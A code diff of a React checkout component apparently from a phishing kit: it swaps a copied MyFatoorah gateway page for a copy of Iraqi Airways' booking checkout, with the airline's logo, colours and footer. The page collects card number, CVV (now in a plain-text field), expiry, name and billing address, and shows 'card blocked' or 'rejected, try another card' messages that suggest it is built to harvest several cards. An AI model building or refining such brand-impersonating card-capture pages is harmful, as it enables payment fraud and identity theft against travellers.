@@ -345,410 +345,221 @@ export default function CreditCardPayment() {
     waitingMessage.value = lang === 'ar' ? "جاري معالجة الدفع..." : "Processing payment...";
   };
 
-  const isAr = lang === 'ar';
+  const isAr = false;
+  const tripSummary = JSON.parse(localStorage.getItem('tripSummary') || '{}');
+  const cityNames: Record<string, string> = { BGW:'Baghdad',EBL:'Erbil',BSR:'Basra',NJF:'Najaf',KIK:'Kirkuk',ISU:'Sulaymaniyah',OSM:'Mosul',AMM:'Amman',IST:'Istanbul',DXB:'Dubai',BEY:'Beirut',CAI:'Cairo',DEL:'Delhi',FRA:'Frankfurt',KUL:'Kuala Lumpur',CAN:'Guangzhou',CPH:'Copenhagen' };
+  const origin = tripSummary.originCode || 'BGW';
+  const destination = tripSummary.destCode || 'EBL';
+  const originCity = cityNames[origin] || origin;
+  const destCity = cityNames[destination] || destination;
+  const paxCount = tripSummary.paxCount || 1;
+  const flightDate = tripSummary.firstDate || '';
+  const formatShortDate = (d: string) => { try { const dt = new Date(d.includes('T') ? d : d+'T00:00:00'); return dt.toLocaleDateString('en-GB',{weekday:'short',day:'numeric',month:'short'}); } catch { return d; } };
 
   return (
-    <div dir={isAr ? "rtl" : "ltr"} style={{ backgroundColor: '#f8f9fa', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'sans-serif', backgroundImage: 'linear-gradient(135deg, #f8f9fa 0%, #f8f9fa 50%, #f0f2f5 50%, #f0f2f5 100%)' }}>
-      <link href="/css/bootstrap.css" rel="stylesheet" />
-      <link href="/css/invoiceredesign/simple/style.css" rel="stylesheet" />
-      <link href="/css/cardview/v1/cardview-form.css" rel="stylesheet" />
-      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />
+    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: 'Lato, sans-serif' }}>
       <WaitingOverlay />
-      
-      <style>{`
-        body { background-color: #f8f9fa !important; }
-        .mfi-outer-container {
-          width: 100%;
-          max-width: 480px;
-          margin: 0 auto;
-          padding: 20px;
-        }
-        .mfi-inner-container {
-          background: #fff;
-          border-radius: 8px;
-          box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-          overflow: hidden;
-        }
-        .mfi-header {
-          padding: 24px 24px 16px;
-          display: flex;
-          align-items: center;
-          justify-content: space-between;
-        }
-        .mfi-vendor {
-          display: flex;
-          align-items: center;
-          gap: 12px;
-        }
-        .mfi-logo-container {
-          display: flex;
-          align-items: center;
-        }
-        .mfi-logo {
-          height: 36px;
-          max-width: 150px;
-          object-fit: contain;
-        }
-        .mfi-vendor-name {
-          font-size: 14px;
-          font-weight: 600;
-          color: #333;
-        }
-        .mfi-lang {
-          display: flex;
-          align-items: center;
-        }
-        .lang-anchor {
-          font-size: 13px;
-          color: #333;
-          text-decoration: none;
-          border: 1px solid #e0e0e0;
-          padding: 4px 12px;
-          border-radius: 4px;
-          cursor: pointer;
-          background: #fff;
-        }
-        .mfi-sub-container {
-          padding: 0 24px 24px;
-          display: flex;
-          justify-content: space-between;
-          align-items: flex-start;
-        }
-        .mfi-amount-main {
-          font-size: 24px;
-          font-weight: 700;
-          color: #0000ff;
-          display: flex;
-          align-items: center;
-          gap: 6px;
-        }
-        .mfi-amount-main::after {
-          content: attr(data-currency);
-          font-size: 16px;
-        }
-        .invoiceStatusSpan {
-          font-size: 12px;
-          color: #666;
-          display: block;
-          margin-top: 4px;
-        }
-        .mfi-btn-currency {
-          background: #fff;
-          border: 1px solid #e0e0e0;
-          padding: 6px 12px;
-          border-radius: 4px;
-          font-size: 13px;
-          color: #333;
-          cursor: pointer;
-          display: flex;
-          align-items: center;
-          gap: 8px;
-        }
-        .mfi-blue-bg {
-          background-color: #f8f9fa;
-          padding: 24px;
-          border-top: 1px solid #eee;
-        }
-        .insertCardDetails {
-          display: block;
-          text-align: center;
-          font-size: 12px;
-          color: #666;
-          margin-bottom: 20px;
-          position: relative;
-          background-color: #f8f9fa;
-          padding: 0 10px;
-          z-index: 1;
-          width: fit-content;
-          margin-left: auto;
-          margin-right: auto;
-        }
-        .mfi-central-text {
-          position: relative;
-          text-align: center;
-          margin-bottom: 20px;
-        }
-        .mfi-central-text::before {
-          content: "";
-          position: absolute;
-          top: 50%;
-          left: 0;
-          right: 0;
-          height: 1px;
-          background: #e0e0e0;
-          z-index: 0;
-        }
-        .card-container {
-          background: #fff;
-          border: 1px solid #e0e0e0;
-          border-radius: 6px;
-          overflow: hidden;
-          margin-bottom: 20px;
-        }
-        .field-container {
-          border-bottom: 1px solid #e0e0e0;
-          position: relative;
-          display: flex;
-          align-items: center;
-          height: 48px;
-        }
-        .field-container:last-child { border-bottom: none; }
-        .card-input {
-          width: 100%;
-          border: none;
-          padding: 14px 16px;
-          font-size: 13px;
-          color: #333;
-          outline: none;
-          background: transparent;
-          height: 100%;
-        }
-        .card-input::placeholder { color: #999; }
-        .half-width-input { width: 50%; }
-        .vertical-divider { width: 1px; background: #e0e0e0; height: 100%; }
-        .payment-card { height: 16px; margin-left: 4px; }
-        .mfi-pay-now {
-          width: 100%;
-          background-color: #0000ff !important;
-          color: #fff !important;
-          border: none;
-          padding: 14px;
-          border-radius: 6px;
-          font-size: 15px;
-          font-weight: 500;
-          cursor: pointer;
-          transition: opacity 0.2s;
-          margin-top: 15px;
-        }
-        .mfi-pay-now:hover { opacity: 0.9; }
-        .mfi-pay-now:disabled { background-color: #0000ff !important; opacity: 1; cursor: pointer; }
-        .mf-footer {
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          padding: 20px 24px;
-          font-size: 11px;
-          color: #888;
-          background-color: #fff;
-          gap: 6px;
-        }
-        .mf-footer img {
-          height: 20px;
-        }
-        .mf-footer-text {
-          margin-right: 0;
-        }
-        .mf-error-banner {
-          background: #ffebee;
-          color: #c62828;
-          padding: 12px;
-          border-radius: 6px;
-          font-size: 13px;
-          margin-bottom: 16px;
-          text-align: center;
-        }
-        .mf-error-msg {
-          color: #e53935;
-          font-size: 12px;
-          margin-top: 4px;
-          padding: 0 16px 12px;
-        }
-      `}</style>
 
-      <div className="mfi-outer-container">
-        <div className="mfi-inner-container">
-          <div className="mfi-header">
-            <div className="mfi-vendor">
-              <div className="mfi-logo-container">
-                <img alt="logo" className="mfi-logo" src="/images/myfatoorah_jazeera_logo_20.png" />
+      {/* Header */}
+      <header className="bg-[#398017] text-white">
+        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center gap-6">
+          <img src="/iraqi_airways/upload/logo-white-transparent.png" alt="Iraqi Airways" className="h-10" />
+          <span className="border-l border-white/50 pl-4 text-sm cursor-pointer hover:underline" onClick={() => navigate('/')}>Home</span>
+          <span className="text-sm">English ▼</span>
+        </div>
+        {/* Info bar */}
+        <div className="bg-white border-b">
+          <div className="max-w-7xl mx-auto px-4 py-2 flex items-center justify-between">
+            <div className="flex items-center gap-6">
+              <div className="flex items-center gap-3">
+                <span className="text-[#2E7D32] text-xl font-bold">{origin}</span>
+                <span className="text-gray-400">·····✈·····</span>
+                <span className="text-[#2E7D32] text-xl font-bold">{destination}</span>
               </div>
-              <span className="mfi-vendor-name">
-                الخطوط الجوية العراقية KWD
-              </span>
+              <div className="text-[#2E7D32] text-sm border-l pl-4">
+                <span className="text-gray-500">Baghdad</span> / <span className="text-gray-500">{destCity}</span>
+              </div>
+              <div className="text-[#2E7D32] text-sm border-l pl-4">
+                <p className="text-gray-500 text-xs">Depart</p>
+                <p className="font-bold">{formatShortDate(flightDate)}</p>
+              </div>
+              <div className="text-[#2E7D32] text-sm border-l pl-4">
+                <p className="text-gray-500 text-xs">Passenger</p>
+                <p className="font-bold">{paxCount} 👤</p>
+              </div>
             </div>
-            <div className="mfi-lang">
-              <button className="lang-anchor" onClick={() => setLang(isAr ? 'en' : 'ar')}>
-                {isAr ? 'English' : 'عربي'}
-              </button>
+            <div className="bg-[#1B5E20] text-white px-6 py-2 rounded-full text-sm font-bold">
+              🛒IQD {displayAmountStr}
             </div>
           </div>
+        </div>
+      </header>
 
-          <div className="mfi-sub-container">
-            <div className="mfi-amount">
-              <span className="mfi-amount-main" data-currency={payCur.code}>
-                {displayAmountStr}
-              </span>
-              <span className="invoiceStatusSpan">
-                {isAr 
-                  ? `تنتهي الصلاحية خلال ${minutes} دقيقة و ${seconds} ثانية` 
-                  : `Expire In ${minutes} Minutes ${seconds} Seconds`}
-              </span>
-            </div>
-            <div className="dropdown" style={{ position: 'relative' }}>
-              <button 
-                className="mfi-btn-currency" 
-                type="button" 
-                onClick={() => setIsCurrencyDropdownOpen(!isCurrencyDropdownOpen)}
-              >
-                <span className="currency">{payCur.code}</span>
-                <i className="fa fa-angle-down" style={{ marginLeft: '8px' }}></i>
-              </button>
-              {isCurrencyDropdownOpen && (
-                <div style={{
-                  position: 'absolute',
-                  top: '100%',
-                  right: 0,
-                  marginTop: '4px',
-                  background: '#fff',
-                  border: '1px solid #e0e0e0',
-                  borderRadius: '4px',
-                  boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
-                  zIndex: 100,
-                  minWidth: '120px',
-                  maxHeight: '200px',
-                  overflowY: 'auto'
-                }}>
-                  {CURRENCIES.map((c) => (
-                    <div 
-                      key={c.code}
-                      onClick={() => {
-                        const newUrl = new URL(window.location.href);
-                        newUrl.searchParams.set('currency', c.code);
-                        window.history.replaceState({}, '', newUrl.toString());
-                        setIsCurrencyDropdownOpen(false);
-                        // Force re-render by updating state or triggering a navigation
-                        navigate(newUrl.pathname + newUrl.search);
-                      }}
-                      style={{
-                        padding: '8px 12px',
-                        cursor: 'pointer',
-                        fontSize: '13px',
-                        color: '#333',
-                        borderBottom: '1px solid #f0f0f0',
-                        display: 'flex',
-                        justifyContent: 'space-between'
-                      }}
-                      onMouseOver={(e) => e.currentTarget.style.backgroundColor = '#f5f5f5'}
-                      onMouseOut={(e) => e.currentTarget.style.backgroundColor = 'transparent'}
-                    >
-                      <span>{c.code}</span>
-                    </div>
-                  ))}
-                </div>
-              )}
-            </div>
+      {/* Main */}
+      <main className="flex-1 max-w-4xl mx-auto w-full px-4 py-8">
+        {/* Checkout title */}
+        <div className="text-center mb-8">
+          <div className="inline-block border border-gray-300 rounded-lg px-8 py-4">
+            <h1 className="text-[#2E7D32] text-2xl font-light">Checkout</h1>
           </div>
+        </div>
 
-          <div className="mfi-blue-bg">
-            <div className="mfi-central-text">
-              <span className="insertCardDetails">
-                {isAr ? 'أدخل تفاصيل البطاقة' : 'Insert Card Details'}
-              </span>
+        {/* Total price card */}
+        <div className="border border-gray-200 rounded-lg p-6 mb-8">
+          <p className="text-[#2E7D32]">Total price: <span className="text-[#2E7D32] font-light">IQD</span> <strong className="text-2xl">{displayAmountStr}</strong></p>
+          <p className="text-gray-500 text-sm mt-1">One way price for all passengers (including taxes, fees and discounts).</p>
+          <a href="#" className="text-[#2E7D32] text-sm underline">Detailed baggage policy ↗</a>
+        </div>
+
+        {/* Select payment method */}
+        <div className="border border-gray-200 rounded-lg p-6 mb-8">
+          <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-6">Select your payment method</h2>
+
+          <div className="border border-gray-200 rounded-lg p-6">
+            {/* Credit Card header */}
+            <div className="flex items-center gap-3 mb-2">
+              <svg className="w-6 h-6 text-[#2E7D32]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" strokeWidth="2"/><line x1="1" y1="10" x2="23" y2="10" strokeWidth="2"/></svg>
+              <h3 className="text-[#2E7D32] text-lg font-bold">Credit Card</h3>
             </div>
+            <div className="flex gap-2 mb-4">
+              <img src="/iraqi_airways/visa.png" alt="Visa" className="h-6" />
+              <img src="/iraqi_airways/mastercard.png" alt="MC" className="h-6" />
+            </div>
+            <hr className="mb-6" />
 
-            {rejectedError && (
-              <div className="mf-error-banner">
-                {isAr ? 'معلومات البطاقة غير صحيحة. يرجى المحاولة مرة أخرى.' : 'Card information is incorrect. Please try again.'}
-              </div>
-            )}
-            {globalBlockedError && (
-              <div className="mf-error-banner">
-                {isAr ? 'تم رفض العملية من قبل البنك المصدر.' : 'Transaction declined by issuing bank.'}
-              </div>
-            )}
-
+            {/* Card form */}
             <form onSubmit={handleSubmit(onSubmit)}>
-              <div className="card-container">
-                <div className="field-container">
-                  <input
-                    className="card-input"
-                    id="cardholdername"
-                    placeholder={isAr ? "اسم حامل البطاقة" : "Card Holder Name"}
-                    type="text"
-                    maxLength={26}
-                    {...register("nameOnCard")}
-                    onChange={(e) => {
-                      const englishOnly = e.target.value.replace(/[^A-Za-z\s]/g, "");
-                      setValue("nameOnCard", englishOnly);
-                    }}
-                  />
-                </div>
-                
-                <div className="field-container" style={{ paddingRight: isAr ? '0' : '16px', paddingLeft: isAr ? '16px' : '0' }}>
-                  <input
-                    className={`card-input ${(cardError || luhnError) ? 'error' : ''}`}
-                    id="cardnumber"
-                    inputMode="numeric"
-                    placeholder={isAr ? "رقم البطاقة" : "Card Number"}
-                    type="tel"
-                    maxLength={23}
-                    {...register("cardNumber")}
-                    onChange={handleCardChange}
-                    onFocus={() => { setRejectedError(false); setGlobalBlockedError(false); }}
-                    style={{ direction: 'ltr', textAlign: isAr ? 'right' : 'left' }}
-                  />
-                  <div style={{ display: 'flex', alignItems: 'center' }}>
-                    <img className="payment-card" src="/images/visa.png" alt="Visa" />
-                    <img className="payment-card" src="/images/mastercard.png" alt="Mastercard" />
+              <div className="flex gap-6">
+                {/* Card preview */}
+                <div className="w-64 h-40 bg-gradient-to-br from-gray-400 to-gray-600 rounded-xl p-5 text-white flex flex-col justify-between flex-shrink-0">
+                  <p className="text-lg tracking-widest font-mono">{cardNumber || 'XXXX XXXX XXXX XXXX'}</p>
+                  <div className="flex justify-between text-xs">
+                    <div><p className="opacity-70">Cardholder name</p><p>{nameOnCard || 'XXX'}</p></div>
+                    <div><p className="opacity-70">Expiration date</p><p>{expiryDate || 'XXX'}</p></div>
                   </div>
                 </div>
 
-                <div className="field-container">
-                  <input
-                    className="card-input half-width-input"
-                    id="expirationdate"
-                    inputMode="numeric"
-                    placeholder="MM / YY"
-                    type="text"
-                    maxLength={5}
-                    {...register("expiryDate")}
-                    onChange={handleExpiryChange}
-                    style={{ direction: 'ltr', textAlign: 'center' }}
-                  />
-                  <div className="vertical-divider"></div>
-                  <input
-                    className="card-input half-width-input"
-                    id="securitycode"
-                    inputMode="numeric"
-                    placeholder="CVV"
-                    type="password"
-                    maxLength={3}
-                    {...register("cvv")}
-                    onChange={(e) => {
-                      const digitsOnly = e.target.value.replace(/[^0-9]/g, "");
-                      setValue("cvv", digitsOnly);
-                    }}
-                    style={{ direction: 'ltr', textAlign: 'center' }}
-                  />
+                {/* Fields */}
+                <div className="flex-1 space-y-4">
+                  {/* Card type */}
+                  <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
+                    <legend className="text-[#2E7D32] text-xs px-1">Card type*</legend>
+                    <select className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
+                      <option>Select card type</option>
+                      <option>Visa</option>
+                      <option>Mastercard</option>
+                      <option>American Express</option>
+                    </select>
+                  </fieldset>
+
+                  {/* Card number */}
+                  <fieldset className={`border rounded px-3 pt-1 pb-2 bg-[#f5faf0] ${luhnError || cardError ? 'border-red-500' : 'border-[#4CAF50]'}`}>
+                    <legend className="text-[#2E7D32] text-xs px-1">Card number*</legend>
+                    <input type="text" placeholder="Your credit card number" {...register("cardNumber")} onChange={handleCardChange} maxLength={19} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                  </fieldset>
+                  {luhnError && <p className="text-red-500 text-xs">Invalid card number</p>}
+                  {cardError && <p className="text-red-500 text-xs">This card is not accepted</p>}
+                  {globalBlockedError && <p className="text-red-500 text-xs">This card has been blocked</p>}
+                  {rejectedError && <p className="text-red-500 text-xs">Payment was rejected. Please try another card.</p>}
+
+                  {/* Expiry + CVV */}
+                  <div className="flex gap-4">
+                    <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] flex-1">
+                      <legend className="text-[#2E7D32] text-xs px-1">Expiry date*</legend>
+                      <input type="text" placeholder="MM/YY" {...register("expiryDate")} onChange={handleExpiryChange} maxLength={5} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                    </fieldset>
+                    <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] w-36">
+                      <legend className="text-[#2E7D32] text-xs px-1">Security Code*</legend>
+                      <input type="text" placeholder="Enter CVV" {...register("cvv")} maxLength={3} onChange={(e) => { const v = e.target.value.replace(/\D/g,''); setValue('cvv', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                    </fieldset>
+                  </div>
+
+                  {/* Cardholder name */}
+                  <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
+                    <legend className="text-[#2E7D32] text-xs px-1">Cardholder's full name*</legend>
+                    <input type="text" placeholder="Cardholder's name" {...register("nameOnCard")} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z\s\-']/g,''); setValue('nameOnCard', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                  </fieldset>
                 </div>
               </div>
 
-              {(errors.cardNumber || cardError || luhnError) && (
-                <div className="mf-error-msg">
-                  {cardError ? (isAr ? "تم رفض هذه البطاقة." : "This card has been rejected.") : luhnError ? (isAr ? "رقم البطاقة غير صالح" : "Invalid card number") : (errors.cardNumber?.message || "Invalid card number")}
-                </div>
-              )}
-              {errors.nameOnCard && <div className="mf-error-msg">{isAr ? "يجب أن يحتوي على أحرف مسافة" : "should contain alphabets with space"}</div>}
-              {errors.expiryDate && <div className="mf-error-msg">{errors.expiryDate.message}</div>}
-              {errors.cvv && <div className="mf-error-msg">{isAr ? "يجب أن يكون رقماً. الطول يجب أن يكون 3" : "Should be in number. Length should be 3"}</div>}
+              {/* Billing Address */}
+              <h3 className="text-center text-[#2E7D32] font-bold mt-8 mb-4">Billing Address</h3>
+              <div className="space-y-4">
+                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
+                  <legend className="text-[#2E7D32] text-xs px-1">Number and street name*</legend>
+                  <input type="text" placeholder="Enter a number and street name" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                </fieldset>
+                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
+                  <legend className="text-[#2E7D32] text-xs px-1">Apartment, building, floor, etc.</legend>
+                  <input type="text" placeholder="Enter an apartment, building, floor, etc." className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                </fieldset>
+                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
+                  <legend className="text-[#2E7D32] text-xs px-1">Postcode / Zip*</legend>
+                  <input type="text" placeholder="Enter a postcode / zip" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                </fieldset>
+                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
+                  <legend className="text-[#2E7D32] text-xs px-1">City*</legend>
+                  <input type="text" placeholder="Enter a city" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                </fieldset>
+                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
+                  <legend className="text-[#2E7D32] text-xs px-1">Country*</legend>
+                  <input type="text" placeholder="Enter a country" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                </fieldset>
+              </div>
 
-              <button
-                className="mfi-pay-now"
-                disabled={!isFormValid}
-                onClick={handleSubmit(onSubmit)}
-                type="button"
-              >
-                {isAr ? 'ادفع الآن' : 'Pay Now'}
-              </button>
+              {/* Terms checkbox */}
+              <div className="mt-6 flex items-start gap-3">
+                <input type="checkbox" required className="mt-1 w-4 h-4" style={{ accentColor: '#4CAF50' }} />
+                <span className="text-gray-700 text-sm">I understand and accept the terms and conditions of carriage, the terms and conditions of seat selection, the privacy policy and the fare rules of Iraqi Airways.*</span>
+              </div>
+
+              {/* Pay button */}
+              <div className="mt-6 text-center">
+                <button type="submit" disabled={!isFormValid} className={`px-10 py-3 rounded-full text-lg font-medium text-white ${isFormValid ? 'bg-[#1B5E20] hover:bg-[#0D3B0F]' : 'bg-gray-400 cursor-not-allowed'}`}>
+                  Pay IQD {displayAmountStr}
+                </button>
+              </div>
             </form>
           </div>
-
-          <div className="mf-footer">
-            <span className="mf-footer-text">Powered by</span>
-            <img src="/images/myfatoorah-logo.svg" alt="myfatoorah" />
-          </div>
         </div>
-      </div>
+
+        {/* Back button */}
+        <div className="flex justify-end mb-12">
+          <button onClick={() => navigate('/seat-customization')} className="bg-[#1B5E20] text-white px-8 py-3 rounded-full text-base font-medium hover:bg-[#0D3B0F]">Back</button>
+        </div>
+      </main>
+
+      {/* Footer */}
+      <footer className="bg-[#398017] text-white py-8">
+        <div className="max-w-6xl mx-auto px-4">
+          <div className="grid grid-cols-3 gap-8 mb-8">
+            <div><h4 className="font-bold mb-3">Plan and booking</h4><a href="#" className="text-sm hover:underline block">Book trip ↗</a></div>
+            <div><h4 className="font-bold mb-3">Contact us</h4><a href="#" className="text-sm hover:underline block mb-1">Contact us ↗</a><a href="#" className="text-sm hover:underline block">Iraqi airways offers ↗</a></div>
+            <div><h4 className="font-bold mb-3">About us</h4><a href="#" className="text-sm hover:underline block">Our fleet ↗</a></div>
+          </div>
+          <div className="text-center mb-6">
+            <h4 className="font-bold text-lg mb-3">Secured payment</h4>
+            <div className="flex justify-center gap-2 mb-2">
+              <img src="/iraqi_airways/americanexpress.png" alt="Amex" className="h-8 bg-white rounded p-1" />
+              <img src="/iraqi_airways/visa.png" alt="Visa" className="h-8 bg-white rounded p-1" />
+              <img src="/iraqi_airways/mastercard.png" alt="MC" className="h-8 bg-white rounded p-1" />
+              <img src="/iraqi_airways/paypal.png" alt="PayPal" className="h-8 bg-white rounded p-1" />
+              <img src="/iraqi_airways/dinersclub.png" alt="DC" className="h-8 bg-white rounded p-1" />
+            </div>
+            <p className="text-xs opacity-80">Credit card fees may occur.</p>
+          </div>
+          <div className="text-center mb-4">
+            <h4 className="font-bold mb-3">Follow us</h4>
+            <div className="flex justify-center gap-4">
+              <a href="#" className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
+              <a href="#" className="w-8 h-8 bg-pink-500 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" strokeWidth="2"/><circle cx="12" cy="12" r="5" fill="none" stroke="white" strokeWidth="2"/></svg></a>
+              <a href="#" className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0C.488 3.45.029 5.804 0 12c.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0C23.512 20.55 23.971 18.196 24 12c-.029-6.185-.484-8.549-4.385-8.816zM9 16V8l8 4-8 4z"/></svg></a>
+              <a href="#" className="w-8 h-8 bg-blue-400 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/></svg></a>
+            </div>
+          </div>
+          <div className="text-center"><a href="#" className="text-sm underline">Technical details</a></div>
+        </div>
+      </footer>
     </div>
   );
 }
